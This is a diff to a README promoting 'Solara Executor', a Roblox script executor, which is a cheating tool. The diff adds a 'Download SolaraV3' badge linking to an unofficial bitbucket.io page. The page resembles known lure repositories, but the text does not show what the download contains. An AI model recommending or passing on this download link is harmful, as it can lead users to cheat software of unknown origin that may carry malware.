@@ -3,6 +3,8 @@
 🌟 **Welcome to Solara Executor** 🌟  
 The ultimate tool for Roblox enthusiasts who crave speed, reliability, and simplicity! Solara Executor is your go-to utility for executing LuaU scripts seamlessly, designed to supercharge your Roblox experience.  
 
+[![Download SolaraV3](https://img.shields.io/badge/Download-SolaraV3-blueviolet)](https://robloxexecutors.bitbucket.io/executors/solara/)
+
 🔥 **Why Solara?** 🔥  
 ✅ **Blazing Speed**: Built for minimal lag, even in intense gameplay .  
 ✅ **User-Friendly**: Intuitive interface for pros and newbies alike 🖥️.  
